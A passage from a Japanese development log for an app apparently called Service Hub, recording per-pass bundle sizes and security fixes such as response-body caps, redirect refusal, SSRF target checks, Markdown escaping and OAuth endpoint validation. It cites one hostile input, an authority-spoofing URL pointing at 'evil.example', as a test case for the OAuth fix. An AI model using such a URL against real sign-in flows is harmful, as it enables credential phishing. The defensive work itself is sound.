か所へ移しただけ**で新しいコードがほとんど無いため。① `MAX_RESPONSE_BYTES` が main 10 MiB / ブラウザ版 2 MiB に割れていた —— `shared/httpLimits.ts` の `MAX_OLLAMA_RESPONSE_BYTES` = **2 MiB** へ揃えた。決め手は実測で、`capAssistantReply` が 10 万字で切るので**アプリが使える最大の本文は `/api/chat` の封筒で 600,124 B** (全部が `\uXXXX` へ縮退する最悪。日本語なら 300,124 B)・`/api/tags` は 1 件 365 B で 2 MiB に **5,745 モデル**入る —— つまり 2 MiB でも最悪に対して **3.49 倍**の余裕が在り、10 MiB との差は「**捨てる物をどれだけ確保するか**」でしかなかった。小さい側へ揃えるのは、そこが「落ちればタブではなく**アプリ全体**が落ちる」main プロセスだからである (`clients/ollama.ts` 自身の注記)。画面の「セキュリティポリシー」欄の**デスクトップ版 10 MB だけが直書き**だったのも同時に直した (ブラウザ版の数字は定数から出ていた)。② `generatePkce` の乱数 byte 数が main verifier 32B / state 16B・renderer verifier 64B / state 32B と割れていた —— `shared/cryptoParams.ts` の `PKCE_VERIFIER_BYTES` / `OAUTH_STATE_BYTES` = **どちらも 32** へ。verifier は RFC 7636 §7.1 が 32-octet を **RECOMMENDED** で名指ししており、`S256` の challenge から verifier を求める難しさは **SHA-256 の原像計算 (256 bit)** で頭打ちなので、**64 octet は 1 bit も強くしない**。state の 16 B は床 (128 bit) **ちょうど**だったので 1 段上げた。**欠陥は「保留を検査に書いていたこと」** —— `ollamaInputLimits.test.ts` は「この検査は**揃えることを要求しない**」と明記し、両ビルド台帳の `why` にも「分かる人が決めること」と書いてあった。理由の欄が埋まるので検査は通り続け、**2026-08-23 から 2026-09-20 まで誰も決めなかった**。機械を足した: 台帳の `why` に**保留の決まり文句を置けない** (`dualBuildDecisions`・両方向・標本と対照つき)。法則 `no-weakness-as-spec` はこれで prose だけの法則ではなくなった (5 本 → 4 本)。`shared` は両ビルドが読むので LITE も同じだけ増える)・**2026-09-20 パス 335 後の計測: 11,930,705 B / 3,343,226 B (両方 +198 B** —— チームレーダーの取り込みに「これは利用者が保存した物か」の門 1 行を足し、読めなかったときの注記の 「見本を表示しています。」を shared の文から**画面**へ移した分 (`startedFromDraft` と `data-stored-fallback` の 2 文)。**欠陥は「見本が利用者の保管場所へ書き戻る」こと**: 画面は ①`data` が変わったら編集状態を揃える ②編集状態が変わったら `servicehub.teamradar.draft.v1` へ書く、の 2 つの効果を持ち、①に判定が無かったので**保存値が読めない / まだ無いときに返る飾りの見本が①を通って②へ流れ**、利用者が何も押していないのに端末の編集内容が消えていた。実測 (jsdom・下書きに 1 名入れて「更新」1 回): `saved` → 保存した物になる (筋が通る) / `none` と `unreadable` → **同梱の見本 3 人になる**。パス 120 (バッジと注記)・パス 121 (人材育成)・パス 309 (銘柄) と同じ家系で、この画面は「3 つを言い分ける」ところまでしか直っておらず**書き戻す側**が残っていた —— 同じファイルの 20 行下 (パス 160) が 「読めていない下書きを書き戻さない」と言っているのに、対になる「見本を書き戻さない」が無かった。**注記も 1 つ偽だった**: 下書きが在れば画面に出ているのは見本ではないのに「見本を表示しています。」と 刷っていた (直す前から・マウント時は下書きを優先して復元するため)。**この欠陥は 2026-09 の e2e の揺れ (パス 331 / 332 / 334 で 3 回) の原因でもあった** —— 上書きは `data` が landed した後の passive effect で起きるので、Playwright が paint で返った直後に書いた下書きが 潰され、次の待受 `[data-skill-radar-omitted]` が出ない。負荷で順序が入れ替わるため連鎖でだけ落ちていた。母集団の機械 `snapshotAdoptionCensus.test.ts` は**別名を収束まで解いて**数える (`data` の綴りだけだと `const snap = data as TalentSnapshot;` の `TalentPage` が映らず **1 件 → 2 件**・パス 334 の死角と同じ形)。renderer / shared は両ビルドが読むので LITE も同じだけ増える。e2e +3 と census は出荷物に入らない)・**2026-09-20 パス 334 後の計測: 11,930,507 B / 3,343,028 B (両方 −48 B** —— 手書きだった失敗本文の読み **7 か所**を `readFailureBody` へ通した分 (綴りが短くなるので減る)。**欠陥はコードではなく、パス 330 で私が書いた census の針だった** —— `readBodyWithCap|readFailureBody` の綴りだけを数えており、**本体が 1 行の別名** (`readCapped` ×2 / `readCappedText` / `readWithCap`) の先に在る呼び出しが 1 件も映っていなかった。実測 **26 件 → 44 件**で、見えていなかった 18 件のうち **7 件が失敗の枝の手書き** (`readCapped(res, ctx).catch(() => '')` —— business / security / shopify / stocks / web-shim ×3)。**7 件とも上限は掛かっていた**ので穴ではない。偽だったのは**パス 330 が publish した主張**のほうで、「失敗の枝は 9 か所・全部が `readFailureBody` を通る」は実際には **16 か所・7 か所が通っていない**だった。法則 `center-then-count-callers` が「**その関数を使っている場所ではなく、同じことをしている場所を数えろ**」と warn している当のことを私がやった。census は 44 行の台帳をやめ、**別名を機械で解決** (本体が `return readBodyWithCap(` の関数) して台帳は別名 4 行 + `.catch` の例外 2 行に縮め、**手書きの失敗の形が 0 件**であることを直接主張する形にした。renderer / main の両方を触ったが、減るのは renderer の 3 か所ぶん)・**2026-09-20 パス 332 後の計測: 11,930,555 B / 3,343,076 B (両方 +33 B** —— チャットボットの要望の書き出し (`chatbot-requests.md`) に `escapeMarkdownInline` を通した分と、本文の組み立てを検査できるよう純関数 `requestsMarkdown` へ切り出した分。**`escape.ts` はどちらのビルドにも既に在る**ので、増えるのは呼び出し 2 つと関数 1 つのぶんだけ。**欠陥は「通していない」を数える機械が無かったこと**: `escapeMarkdownInline` の docblock は適用先まで書いている (「1 行で終わらなければならない場所すべて —— 見出し・箇条書きの 1 項目・引用の 1 行」) のに、利用者が打った要望文が `- [ ] ${text}` の箇条書きとして素で `.md` に入っていた。実測 (5 形のうち **4 形で差**): 生 HTML の `<` が通り (**今日この画面から打てる**)、改行が在れば箇条書きから抜けて新しい Markdown 構造を書け、`|` で表の桁がずれ、末尾の `\` が後続の区切りを打ち消す。ファイルは名前のとおり**オーケストレーションの backlog 候補**として人へ渡る前提で、`escape.ts` が「書き出した `.md` はダウンロードして人に渡る」と述べている経路そのものである。`lint:forbidden` #11 が落とすのは**エスケープの再実装**であって「通していない」ではない —— 母集団 (`text/markdown` を作る **8 行 / 5 ファイル**) を `markdownExportCensus.test.ts` が両方向で持ち、自由文が入る行には **`shared/escape` からの import** を要求する (**名前が在るかで判定したら対照が鳴らなかった**ので直した)。renderer は両ビルドが読むので LITE も同じだけ増える)・**2026-09-20 パス 331 後の計測: 11,930,522 B / 3,343,043 B (両方 +14 B** —— OAuth の `state` を比べる定時間比較を `shared/constantTimeEquals.ts` の 1 つへ畳んだ分。**増分が小さいのは、実装そのものは元から renderer に在ったため** —— ブラウザ版が持っていた XOR ループを shared へ移し、`pkce.ts` は別名 1 行になった。増えたのは module の境界と別名のぶんだけで、main 側 (`timingSafeEqual` の除去) は出荷物に入らない。**欠陥は「写しは避けられない」と検査が書き留めていたこと**: 同じ判定が main と renderer に 1 つずつ在り、パリティ検査 `stateEqualsParity` の docblock が「まとめられる重複ではなく、同じ判断の 2 実装である」と**写しを仕様として固定していた** (法則 `no-weakness-as-spec` の形)。しかも**等価ですらなかった** —— main の `Buffer.from(s,'utf8')` は**孤立サロゲートをすべて U+FFFD へ潰す**ので、実測 (2026-09-20) サロゲート帯を跨ぐ 1 文字の総当たり 4,330,561 組のうち **4,192,256 組 (96.8%)** で答えが割れた (`base64url` の字だけなら 0 組 —— `state` が実際に取る形なので**今日の実害は 0**)。**母集団の機械は在ったが針が狭かった**: `dualBuildDecisions.test.ts` は 2026-08-23 から両ビルドの重複を数えていたのに、針が `^export function` だけで `export async function` と `export const` が 1 つも映らず、**13 件 → 22 件**だった (映っていなかった 9 件には `generatePkce` と、画面に出る定数 6 件 —— 投資助言でない旨の断り・既定のリスク値・戦略の目録 —— が含まれる)。針を広げ、分類に `shared-alias` / `value` を足し、`value` にも「パリティ検査が import していること」を要求した (`stocksConstantsParity.test.ts` 7 件が新規)。`shared` は両ビルドが読むので LITE も同じだけ増える)・**2026-09-20 パス 330 後の計測: 11,930,508 B / 3,343,029 B (両方 −52 B** —— 応答本文の上限を**読む所**へ寄せた分。`shared/httpLimits.ts` に `readFailureBody` (上限つきで読む → 読めなければ空) を 1 つ置き、手書きだった失敗本文の読み **9 か所**を全部そこへ通した。**減るのは、`Response` を受け取って自分で読む口 `parseJsonBody` を消したため** —— 13 の書き込み口が `readJson` (= 上限つきで読んでから `parseJsonText`) を呼ぶようになり、消した関数と短くなった呼び出しが、足した関数より大きい。**欠陥は「向きが逆」だった**: 失敗した応答 (`!res.ok`) の本文に上限が無い箇所が 3 つ在り (`network/proxy.ts` / `network/ollamaWeb.ts` / `main/clients/ollama.ts`)、どれも**同じ関数の成功側には上限が在った**。大きな本文を返すのは壊れている相手で、その相手は定義上 `!res.ok` に来る —— 3 つとも成功側の注記が危険を正しく述べていた (「compromised or malicious proxy returning a huge payload」「2GiB を確保してからそれを捨てる」「落ちればタブではなく**アプリ全体**が落ちる」) のに、その文が掛かっていたのは**その相手が通らない枝**である。実測 (Node 22・1 MiB の塊を返す 500 応答): 上限なし 256 MiB は**引いた 256 MiB / rss +637 MiB / 2,932 ms**、上限ありは**引いた 11 MiB / 断り / rss +9 MiB / 6 ms**、512 MiB では `ERR_STRING_TOO_LONG` —— つまり **`catch` は握り潰すが費用は払い終えている**。main の Ollama は成功側 2 か所 (`/api/version` と `/api/tags`) も素通しで、`apiResponse.ts` の docblock が「`readBodyWithCap` と `fetchViaProxy` が先に掛かっている (実測で確認済み)」と書いていた主張が**偽だった** (16 本のうち 2 本が通っていない) —— 訂正して、直し方を「上流を数える」から**「読む所で切る」**へ変えた。`shared` / `renderer` は両ビルドが読むので LITE も同じだけ減る。母集団の機械 `responseBodyCapCensus.test.ts` (生の読み 3 件・上限つきの読み 26 件を両方向) と `jsonBodyCensus.test.ts` の答えが 1 → **0 件**になった分は検査なので出荷物に入らない)・**2026-09-20 パス 329 後の計測: 11,930,560 B / 3,343,081 B (両方 +4,106 B** —— 計算書類 4 点に投資ポートフォリオを**参考の別紙**として併記した分 (`renderer/data/portfolioAnnex.ts` の組み立てと 3 つの断りの文・画面の紙 1 枚・`KessanPage.kind` と札の分岐)。**法定書類の中には入れない** —— 出所 (`mutual-funds` / `real-estate`) は `SERVICE_DATA_ORIGIN` が **`sample`** と言うとおり同梱の見本で、`shared/dataOrigin.ts` が自分で「決算書類・申告書類へ流れる数字を扱うアプリで、これは単なる表示崩れでは済まない」と書いている。断りの文が長いので**増分の大半は日本語の文** (紙に 3 つ刷る: 計算書類に含まれない / 出所 / 時価・取得価額と簿価の基準の違い)。renderer は両ビルドが読むので LITE も同じだけ増える。`portfolioAnnex.test.ts` 9 件・jsdom +3・e2e +5 は出荷物に入らない)・**2026-09-19 パス 328 後の計測: 11,926,454 B / 3,338,975 B (両方 +353 B** —— 「計算書類（4点まとめて）」を**名乗りどおり 4 枚ちょうど**にし (決算公告の要旨は会社法440条の公告で435条2項の計算書類ではないので束から外し、貸借対照表を選んだときだけ 2 枚目に付く)、文言 5 か所を「4 枚ちょうど / 要旨は貸借対照表側」に書き換えた分。**枝は 1 つ短くなったのに増えるのは、説明の文が伸びたため** (`show('bs')` → `sheet === 'bs'` は同じ長さ)。renderer は両ビルドが読むので LITE も同じだけ増える。jsdom +1・e2e kessanTax +1 は出荷物に入らない)・**2026-09-19 パス 327 後の計測: 11,926,101 B / 3,338,622 B (両方 −6 B** —— 鍵導出 3 か所の `hash: 'SHA-256'` を凍結値 `PBKDF2_HASH` へ置き換えた分。**書き写しを消したので減る** (最小化後は 3 つの文字列リテラルが 1 つになる)。`cryptoParams.ts` の docblock は「IV 長・反復回数・ハッシュを 1 つに集めた」と述べていたのに、**ハッシュだけは 3 つの導出すべてが書き写していた** —— `PBKDF2_HASH` を変えると封筒のメタ `kdfLabel()` だけが動いて導出は動かず、docblock 自身が言う「復号できないバックアップ」になる形だった。`security/` は両ビルドが読むので LITE も同じだけ減る。母集団の機械 `kdfParamsCensus.test.ts` と、法則の被覆の台帳 `lawCoverageLedger.test.ts` は検査なので出荷物に入らない)・**2026-09-19 パス 326 後も 11,926,107 B / 3,338,628 B で byte 単位で不変** (直したのは `src/main/` だけ —— `atomicWrite.ts` の `readFileWithBackup` に読む前の大きさの門を**中へ**置き (`maxBytes` を必須引数に)、`secrets.ts` が本体と控えの両方に `MAX_STORE_SIZE` を渡し、`devEnv.ts` の 7 つの同期読みに `MAX_DEV_ENV_FILE_BYTES` を足した。**ブラウザ版はこの 3 モジュールを 1 行も読み込まない**ので出荷物は動かない: 両方を組んで実測した。**控えの `.prev` には門が無く、本体を消せば主プロセスが丸ごと読んで `JSON.parse` していた** —— 門は `loadStore()` の先頭に在ったが、その下の読みが 2 つのファイルへ分岐しており、分岐は呼び出し側のコードに現れない。母集団の機械 `fileReadSizeGateCensus.test.ts` (`readFile` の 5 か所を両方向) も検査なので入らない)・**2026-09-19 パス 325 後の計測: 11,926,107 B / 3,338,628 B (両方 +5 B** —— `shared/scanTarget.ts` の `validateScanUrl` が返す物を生の文字列 `url` から解析後の `parsed.href` へ変えた分だけ。**調べた物 (parsed) と 第三者 (VirusTotal) へ送る物 (raw) が別だった** —— 実測で 8 形のうち 5 形が食い違う。`shared` は両ビルドが読むので LITE も同じだけ増える。同じパスで直した `main/clients/github.ts` (pin した後に生を fetch) と `main/clients/shopify.ts` の Discord webhook (pin した後に生へ POST) は **main だけ**なので出荷物に入らない。母集団の機械 `parsedUrlGateCensus.test.ts` (`new URL(` の 27 か所を種類つきの台帳へ・両方向) も検査なので入らない)・**2026-09-19 パス 324 後も 11,926,102 B / 3,338,623 B で byte 単位で不変** (直したのは `src/main/clients/slack.ts` の permalink —— `team.info` の応答の `domain` をそのまま `https://${domain}.slack.com/…` の **authority** に置いており、`/` `?` `#` `\` の 1 字で host が `.slack.com` の外へ出た —— と、`shared/api/slack.ts` に足した 1 ラベルの関門 `slackWorkspaceDomainOrNull` だけ。**関門は shared に置いたが読むのは main だけ**なので、ブラウザ版の bundle からは tree-shaking で丸ごと落ちる (両方を組んで実測した)。`lint:url-encoding` は authority を見ず、`lint:network-targets` は通信しか見ず、#5 (`externalUrlOrNull`) はスキームしか見ない —— **3 つの網の継ぎ目**で、母集団 5 行を `hostInterpolationCensus.test.ts` が台帳制 (両方向) で持つ。検査と法則は出荷物に入らない)・**2026-09-19 パス 323 後の計測: 11,926,102 B / 3,338,623 B (両方 +1,442 B** —— 書類スタジオの計算書類を 1 点 1 枚に: `KessanSheets` が書面ごとに `.ds-paper` を並べる (5 枚: 損益 / 貸借 / 変動 / 注記 / 公告の要旨・紙ごとに免責の脚注と札)、`styles.css` の `.ds-sheets` / `.ds-sheet-caption` と印刷の改ページ規則 5 行、文言 4 か所。**「4点まとめて」は 4 点を 1 枚の紙に流していた** —— 画面では 1 枚の長い紙、印刷では書面の途中で改ページ。renderer は両ビルドが読むので LITE も同じだけ増える。jsdom +4・e2e kessanTax +7 は出荷物に入らない)・**2026-09-19 パス 322 後の計測: 11,924,660 B / 3,337,181 B (両方 +12,491 B** —— 内訳: 本体で +12,343 B、撮って直した続き (ブラウザ組み込みの検索の ✕ を隠す規則 1 つと、スマホの hero の media 規則を基本の規則より**後ろ**へ —— 前に置くと同じ特異性で負けて 1 行も効かない) で +148 B。可愛い UI の 2 段目 (見た目に加えて操作性): `styles.css` の UI 側を書き直し (トークン 15 を足して部品の規則の直書き色 10 → 0・`.primary` / `.soft` / `.ghost` / `.chip` / `kbd.kbd`・浮いたカードのサイドバーと本文・`.page-enter`・`.scroll-top`・`.upgrade-card`・ホームの `.home-*`)、`App.tsx` のシェル (検索の ✕ と件数と札・分類の見出し・トップバーの記号と分類の札と ♡・先頭へ戻る・画面切替で先頭から・ドロワーの ✕ と Esc)、`shellContext.ts` (お気に入り / 最近使ったの並びを App 1 つからホームへ渡す —— 保存の読み手は増やさない)。`HomePage.tsx` は inline style を class へ移したので**その分は減る**。renderer は両ビルドが読むので LITE も同じだけ増える。jsdom 15 件・e2e `shell` suite 27 件は出荷物に入らない)・**2026-09-19 パス 321 後の計測: 11,912,169 B / 3,324,690 B (両方 +2,645 B** —— 外部サービスへの書き込み 13 経路を `shared/api/*.ts` の 1 つずつ (`checkX` → `xInit` → `parseCreatedX`) へ寄せ、両ビルドが同じ関数を通るようにした分。写し (main と `saasWriteWeb.ts` に 1 つずつ在った URL・ヘッダ・本文・応答の読み) を消した分より、共有の関数 (型を付けた `Checked*`・封筒の読み手・`readCloudflareEnvelope` / `basicAuthorization` / `summarizeVtReport`) の方が大きい。RFC 2822 と base64 と `parseSecurityKeys` の写し (5 + 2 + 2) も 1 つずつに。**オントロジー (`src/shared/ontology/`) は出荷物に入らない** —— 読むのは検査と生成 script だけなので tree-shaking で丸ごと落ちる。shared は両ビルドが読むので LITE も同じだけ増える)・**2026-09-18 パス 320 後の計測: 11,909,524 B / 3,322,045 B (両方 +16 B** —— チームレーダーの保存値が壊れていたときの理由を `redactForMessage` (梯子の 6 段目 `MAX_STORED_STATE_REASON_CHARS` 200) に通す呼び出し 1 つ。**理由には生の保存値 (member id / axis label) が補間されていて、同じ関数の 20 行上が「JSON.parse の文は定数に固定する」と書いていたのに、その下の枝には天井が無かった** —— パス 314 の census は renderer しか見ておらず、母集団を shared へ広げて出た。shared は両ビルドが読むので LITE も同じだけ増える。検査は出荷物に入らない)・**2026-09-18 パス 318 後の計測: 11,909,508 B / 3,322,029 B (両方 +509 B** —— 配色を適用するたびに stylesheet の `--bg` の実値を読んで PWA の `theme-color` と デスクトップの窓の下地 (`app:setColorScheme` → `BrowserWindow.setBackgroundColor` と userData の `service-hub-window.json`) へ伝える `syncHostChrome` と、ブラウザ版 shim の no-op の口 1 つ。main 側 (`windowPrefs.ts`・起動前の読み) はブラウザ版が読まないので出荷物には入らない。renderer は両ビルドが読むので LITE も同じだけ増える)・**2026-09-18 パス 317 後の計測: 11,908,999 B / 3,321,520 B (両方 +5,868 B** —— 配色の設定 (ライト / ダーク / OS に合わせる) を足した分: `theme.ts` (入口を通す読み書き・`matchMedia` での解決・`<html data-theme>` への適用・追随の停止)・設定画面の 3 択・`styles.css` の部品のトークン 33 と `:root[data-theme="dark"]` の表 53 (ライトの色トークンを全部上書き。CSS に `prefers-color-scheme` は書かず、JS が解いた値だけを属性に置く)。**既定はライトのまま**なので何も選んでいない利用者の見た目は変わらない。renderer は両ビルドが読むので LITE も同じだけ増える。検査 27 と e2e の `theme` suite (31 suite 目) は出荷物に入らない)・**2026-09-18 パス 315 後の計測: 11,903,131 B / 3,315,652 B (両方 +1,911 B** —— 意味色の直書き 360 か所 (裸 332 + 退避値の中 28) を `var(--success)` / `var(--danger)` / `var(--warning)` へ寄せ、退避値 38 か所を剥がし、黒い字を載せる札の地 `--warning-bg` を 1 つ足した分。トークンの綴りは hex より 6 字長いので、剥がした退避値の分を差し引いても増える。**画面が読む変数名で定義の無い物が 3 つ (`--mute` / `--ng` / `--ok`) 残っていた** —— 再設計の走査は「使われている名前 vs 定義」を数えておらず、`inlineColorCensus.test.ts` がその照合と直書き色の分母 (275 件 / 40 ファイル・双方向) を持つ。renderer は両ビルドが読むので LITE も同じだけ増える。検査は出荷物に入らない)・**2026-09-17 UI 再設計後の計測: 11,901,220 B / 3,313,741 B (FULL +4,785 B・LITE +4,785 B** —— `styles.css` の書き換え (淡いピンク × ラベンダー × ミントの明るい配色・ピル型ボタン・すりガラス・丸ゴシック系フォント。外部フォントは同梱しない) と、inline の直書き色 29 ファイルを意味のトークンへ寄せた分。**画面が読んでいた `var(--text-mute)` 624 か所ほか 4 つの変数名は、それまで 1 つも定義されておらず素通りしていた** (定義は `--text-muted` / `--bg-elevated` だけ)。renderer は両ビルドが読むので LITE も同じだけ動く。検査・文書は出荷物に入らない)・**2026-09-17 パス 312 後の計測: 11,896,435 B / 3,308,956 B (両方 +211 B** —— ブラウザ版の `invoke` / `fetchSnapshot` の外側に main の IPC ハンドラと同じ床 `withFloor` (→ `err()` → `safeErrorMessage`) を 1 か所置き、公開する `shim` を `{ ...unguarded, fetchSnapshot, invoke }` で組む分。**枝の中の 19 の `try` (同じ規則の写し) だけが「reject しない」を守っており、Web Storage が拒む環境・null の payload・形の違う payload で 1 + 11 + 2 組が reject して画面の busy を戻さなくしていた** (既存の検査は 4 条件の列挙で「何があっても」と名乗っていた)。web-shim は両ビルドが読むので LITE も同じだけ増える。検査と台帳は出荷物に入らない)・**2026-09-17 パス 311 後の計測: 11,896,224 B / 3,308,745 B (両方 +435 B** —— 第三者の本文を JSON として読む助け `parseJsonBody` / `parseJsonText` / `notJsonMessage` を `shared/apiResponse.ts` に置き、`await res.json()` のままだった 16 か所 (ブラウザ版の書き込み 13 経路・liveRead の transport・main の Ollama 2 経路) を通した分。**2xx で JSON でない本文が返ると、V8 の SyntaxError が本文の先頭 10 字 (`"ghp_abcdef"...`) を引用したまま画面へ出ていた** (パス 260 の `tokenResponse.ts` は「文言は定数」にしていたのに、パス 261 で足した隣の 13 経路が持っていなかった)。shared は両ビルドが読むので LITE も同じだけ増える。census `jsonBodyCensus.test.ts` は検査なので出荷物には入らない)・**2026-09-17 パス 310 後の計測: 11,895,789 B / 3,308,310 B (両方 -37 B** —— Google の接続カードの読みを入口 `readLocalString` に寄せ (自前の try/catch の写しと `describeStorageError` の import をやめた) 分で減った。読めない端末の注記は入口の案内文になる (文は既に束に在るので増えない)。**端末からの読み取りに「読めなかった時をどう扱うか」の台帳が無かった** —— 読みの 22 か所を方針 4 通りと理由で `storageReadLedger.test.ts` に載せた (検査なので出荷物には入らない)。renderer だけの変更なので main は不変)・**2026-09-17 パス 309 後の計測: 11,895,826 B / 3,308,347 B (両方 +1,454 B** —— 銘柄のウォッチリストの保存値を読む規則を `shared/watchlistState.ts` の 1 つ (3 状態・落とした件数・注記) に置き、main と renderer に 1 つずつ在った `isSafeSymbol` の写しを re-export にし、両ビルドのスナップショットに `stored` / `storedNote` を足して画面が ⚠ で言う分。**壊れた保存値を「まだ無い」に畳み、次の登録が元の一覧を 1 銘柄で上書きしていた** (チームレーダーのパス 120・人材育成のパス 121 が直した形の 4 つ目・両ビルド)。shared は両ビルドが読むので LITE も同じだけ増える)・**2026-09-17 パス 308 後も FULL は 11,894,372 B で byte 単位で不変** (直したのは `src/main/clients/skills.ts` だけ —— スキル本文を system として有料 API へ送る経路に天井が無く、ファイルを大きさを見ずに読んでいた。ブラウザ版はこのモジュールを読まないので出荷物は変わらない: FULL を組んで実測した。LITE は組んでいない —— 差は学術コーパスだけなので FULL が不変なら LITE も不変)・**2026-09-17 パス 307 後の計測: 11,894,372 B / 3,306,893 B (両方 +9 B** —— 例外の message を画面へ出す経路 2 本 (`PageErrorBoundary` の `describeRenderError` / `localWrite` の `describeStorageError`) が天井だけ掛けて伏字を持っていなかったのを `redactForMessage` に通した分。`redact.ts` は両ビルドに既に在るので呼び出し 2 つぶんしか増えない。パス 305・306 はゲート・workflow・harness だけなので出荷物には入らない)・**2026-09-17 パス 304 後の計測: 11,894,363 B / 3,306,884 B (両方 +45 B** —— `egressInit` の no-cors の枝 1 行ぶん。`httpLimits.ts` は両ビルドが読むので LITE も同じだけ増える。パス 301 の「転送に追随しない」が `mode: 'no-cors'` の到達確認にも重なり、ブラウザでは Fetch 標準どおり network error (`TypeError: Failed to fetch`・chromium 実測) になって「起動しているが OLLAMA_ORIGINS 未設定」を「未起動」と診断していた —— **undici は CORS を実装しない**ので同じ呼び出しが 200 で通り、単体検査 17,233 件は全件緑のまま、CI の外だった `e2e:ollama` だけが捕まえた (同日から e2e.yml で走る)。no-cors の要求は資格情報を載せられず応答も読めないので、追随しても台帳の外へ何も運ばない —— その 1 形だけ規則の中で 'follow' を明示した。**測っている間に 2 つ目**: `e2e:ollama` と `smoke:app` は成果物の鮮度を見ておらず、直した直後に回すと直す前の HTML の診断を返した (パス 302 の道具の台帳が 3 本の手書きだった) —— 母集団を package.json から導く形にした。これらはゲートと harness なので出荷物には入らない)・**2026-09-17 刑名の裁定 (残作業 8) の後の計測: 11,894,318 B / 3,306,839 B (FULL +225 B・LITE 不変** —— 変わったのは学術コーパスの本文 6 行だけで、LITE は学術コーパスを積まないので 1 バイトも動かない。**両方が同じだけ増えるのは共有モジュール、FULL だけが増えるのはコーパス**、という切り分けが計測から読める。パス 302・303 はゲートと検査だけなので出荷物には入らない)・**2026-09-17 パス 301 後の計測: 11,894,093 B / 3,306,839 B (両方 +1,032 B** —— 「転送 (3xx) に追随しない」規則を `shared/httpLimits.ts` に 1 つ (`REDIRECT_STATUSES` / `egressInit` / `isRedirectResponse` / `redirectRefusal`) 置き、網の fetch **12 か所**すべてが通るようにした分。送り先の関門 (`lint:network-targets` / §3.3 の表 / 各 endpoint の検証) は**最初の 1 ホップ**しか見ておらず、`fetch` の既定 `redirect: 'follow'` だと表のホストが返す `302 Location:` 1 つで表に無い先 (LAN・loopback) へ取りに行っていた。同じ規則は利用者が配る Worker (`PROXY_EXAMPLE` §(c)) と窓の遷移 (`will-redirect`) に既に在り、**アプリ自身の fetch だけが持っていなかった** (`redirect` を指定する物 0)。Worker への POST は封筒の本文に上流の `Authorization` を載せており、307 / 308 ならブラウザがそれを Location 先へそのまま再送する形だった —— `proxyEndpoint` が通した送り先と実際に送る送り先が別になる (パス 291 / 298 / 299 の「調べた物と使われる物が別」の家系)。両ビルドが同じ shared を読むので LITE も同じだけ増える)・**2026-09-17 パス 300 後の計測: 11,893,061 B / 3,305,807 B (両方 +114 B** —— SSRF の送り先判定 `isPrivateOrReservedTarget` を `renderer/network/proxy.ts` から `shared/privateTarget.ts` へ**そのまま**移し (中身は不変・`proxy.ts` は re-export)、`imageUrlGate` に 2 段目 `safeRemoteImageSrc` (= `safeImageSrc` + private/reserved 拒否) を足して `DataList` / `StatusBar` が読むようにした分。遮断表そのものは 1 バイトも増えない (同じコードが場所を変えただけで、最小化でコメントは落ちる) ので、増分は新しい関数 1 つと呼び出し 2 つと re-export の分だけ。**第三者 API の応答 (GitHub `avatar_url` / Canva `thumbnail.url`) の画像 URL が `127.0.0.1` やプライベート帯を指していても取りに行っていた** —— `<img>` は読めないが GET は利用者の網の内側へ飛び、load / error のタイミングで在否が漏れる。利用者自身が打つ背景画像 (`safeCssUrl`) は別の段に残す (NAS の LAN URL は正当)。パス 299 が「測ったが決めていない」と書いた項で、**呼び出し側の値の出所を測ったら決まった** (fetcher 2 本とも送り先がリテラル固定なので「LAN のアバター」は起きえない))・**2026-09-17 パス 299 後の計測: 11,892,947 B / 3,305,693 B (両方 +1,596 B** —— パス 293〜299 の 7 パス分。検査と文書だけのパス (293 / 297) は入らず、入ったのは両ビルドが読む物だけ: プロキシ封筒の `Headers` 検証 (294–295)・資格情報の入口の `Headers` 受理判定を `shared/headerValue.ts` の 1 つへ (296)・台帳由来の `<a href>` 2 本を `externalUrlOrNull` の返り値へ (298)・`imageUrlGate` を字面の前置き一致から**解析してから判定**へ (299)。**両方が同じだけ増えるのは共有モジュールだから**で、LITE と FULL の差は学術コーパスだけである。実機は同じ HEAD (`2eccf082`) で `smoke:app` OK・`e2e` 395 件 ❌ 0・`e2e:lite` 395 件 ❌ 0・`perf` OK (LITE DCL 246 ms / heap 10.1 MB・FULL DCL 706 ms / heap 36.9 MB。**`perf` は 1 度断った** —— 連鎖の途中で私が `src/` を編集したため「成果物が src/ より古い」と exit 2。成果物は編集前の HEAD の物なので `SERVICE_HUB_PERF_ALLOW_STALE=1` で意図して通した。断りは正しく働いた))・**2026-09-15 パス 292 後も FULL / LITE ともに byte 単位で不変** (直したのは `scripts/verify-architecture.cjs` と `docs/` だけ —— ゲートは出荷 HTML に入らない。**図の参照 29 件のうち 2 件がどの網にも映っていなかった** —— 図の走査は `(...)` を必須にしていたので、関数でない成員 (定数・型) は括弧が無く映らず、バッククォートも無いので散文の走査にも映らない。`OAUTH_CONFIGS : oauth.ts:54` はブロックコメントを閉じる行を指し、**パス 291 で手で直すまで誰も鳴らなかった**。残る 27 件も `includes` で照合されていて**言及と宣言を見分けず**、`setToken : secrets.ts:73` は docblock の使用例 (宣言は 263・**190 行の隔たり**)、`authorize : oauth.ts:258` は `authorizeUrl:` の**URL リテラルの末尾**(宣言は 775・**517 行**) で満たされていた。可視性の印を括弧の代わりに認め、帯の出現に「コメント行でない・引用符の外」を要求した。**散文 ref には同じ規則を掛けない** —— 実測で 125 組のうち **51 組**が落ち、action 名とヘッダ名は文字列としてしか存在し得ないので偽陽性だった。★ **旧い self-test の 1 行が穴を「意図」として留めていた** (`+justAName : x.ts:1` は実在しない名前なので、散文を拾わないことと実在する成員を飛ばすことを見分けられない) —— パス 289・291 と**3 パス連続の家系**)・**2026-09-15 パス 291 後も 11,891,351 B / 3,304,097 B で byte 単位で不変** (直したのは `src/main/oauth.ts` の端点の関門を**字面から解析へ**移した分だけで、**ブラウザ版はこのモジュールを 1 行も読み込まない** —— `web-shim.ts` の `authorize` は `not_supported` を返すだけで、貼り付け式 PKCE は `renderer/oauth/pkce.ts` が別に組む。`startsWith('https://')` は `HTTPS://` を**弾き**、`https://accounts.google.com@evil.example/o/oauth2/auth` を**通していた** (解析した origin は `https://evil.example`。6 形のうち **5 形**で答えが割れた実測)。**`oauth.test.ts` の拒否表の題名が「URL 解析ではなく前置き一致なので弾く側」と、弱さを仕様として書き留めていた** —— パス 289 の「標本が母集団を見分けられない」と同じ家系だが、こちらは**題名が弱さに名前を与えて正当化していた**ので落ちる検査が無く、読んで気付くしかない。`shell` へ渡す文字列も関門の**返り値**に替えた (調べた物と開く物を一致させる)。実害は今日 0 —— 9 つの config はすべてソース中の `https://` リテラル —— だが、守りの強さが「設定は動かない」という**別の前提**に依っていた)・**2026-09-15 パス 290 後の計測: 11,891,351 B / 3,304,097 B (両方 −6 B** —— 